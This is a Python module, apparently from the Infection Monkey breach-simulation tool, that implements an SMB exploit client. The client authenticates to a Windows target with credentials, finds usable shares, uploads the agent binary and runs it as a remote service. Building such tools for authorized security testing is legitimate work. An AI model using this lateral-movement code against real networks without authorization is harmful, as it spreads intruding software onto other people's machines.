import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Optional, Sequence, Tuple

from common import OperatingSystem
from common.credentials import Credentials
from common.types import Event
from infection_monkey.exploit.tools import RemoteFileCopyError
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost

from .smb_client import SMBClient
from .smb_command_builder import build_smb_command
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"


class CopiedFileDetails:
    """Stores the details of a copied file"""

    def __init__(self, remote_path: PurePath, destination_path: PurePath):
        self.remote_path = remote_path
        self.destination_path = destination_path


class SMBExploitClient:
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        host: TargetHost,
        options: SMBOptions,
        smb_client: SMBClient = SMBClient(),
    ):
        self._host = host
        self._options = options
        self._copied_file_details: Optional[CopiedFileDetails] = None
        self._authenticated_credentials: Optional[Credentials] = None
        self._smb_client = smb_client

    def authenticate(self, credentials: Credentials) -> bool:
        """Returns True if authentication succeeded, False otherwise
        Side effect: The SMB connection is established on success"""

        if not self._smb_client.connect_with_user(
            self._host, credentials, timeout=self._options.smb_connect_timeout
        ):
            return False

        self._authenticated_credentials = credentials
        return True

    def get_os(self) -> OperatingSystem:
        return OperatingSystem.WINDOWS

    def execute(
        self,
        servers: Sequence[str],
        current_depth: int,
        interrupt: Event,
    ):
        """Raises an exception if the execution failed"""
        if not self._authenticated_credentials:
            raise Exception("Not authenticated")

        if not self._copied_file_details:
            raise Exception("File was not copied before executing it")
        command = build_smb_command(
            servers,
            current_depth,
            self._copied_file_details.remote_path,
            self._copied_file_details.destination_path,
        )

        self._smb_client.run_service(
            SERVICE_NAME,
            command,
            self._host,
            [139, 445],
            self._authenticated_credentials,
            self._options.smb_connect_timeout,
        )

    def copy_file(
        self,
        file: BytesIO,
    ):
        """Raises an exception if the copy failed"""
        if not self._smb_client.query_server_info():
            raise RemoteFileCopyError("No server information is available")

        destination_path = get_agent_dst_path(self._host)
        shares = self._query_shares(destination_path)
        for remote_path, share_name, share_path in self._connected_shares(shares):
            logger.debug(
                f"Trying to copy monkey file to share '{share_name}' "
                f"[{share_path}{remote_path}] on victim {self._host}"
            )

            try:
                if not self._smb_client.connected():
                    raise RemoteFileCopyError("Not authenticated")
                self._smb_client.set_timeout(self._options.agent_binary_upload_timeout)
                self._smb_client.send_file(share_name, remote_path, file.read)

                logger.info(
                    f"Copied monkey agent to remote share '{share_name}' "
                    f"[{share_path}] on victim {self._host}"
                )

                self._copied_file_details = CopiedFileDetails(
                    PurePath(ntpath.join(share_path, remote_path.strip(ntpath.sep))),
                    destination_path,
                )

            except Exception as exc:
                error_message = (
                    f"Error uploading monkey to share '{share_name}' on victim {self._host}: {exc}"
                )
                logger.error(error_message)
                raise RemoteFileCopyError(error_message)

    def _query_shares(self, path: PurePath):
        resp = self._smb_client.query_shared_resources()
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    self._host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    self._host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def _connected_shares(self, shares):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not self._smb_client.connected():
                if not self._authenticated_credentials:
                    break
                self._smb_client.connect_with_user(self._host, self._authenticated_credentials)
                if not self._smb_client.connected():
                    break

            try:
                self._smb_client.connect_to_share(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {self._host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path
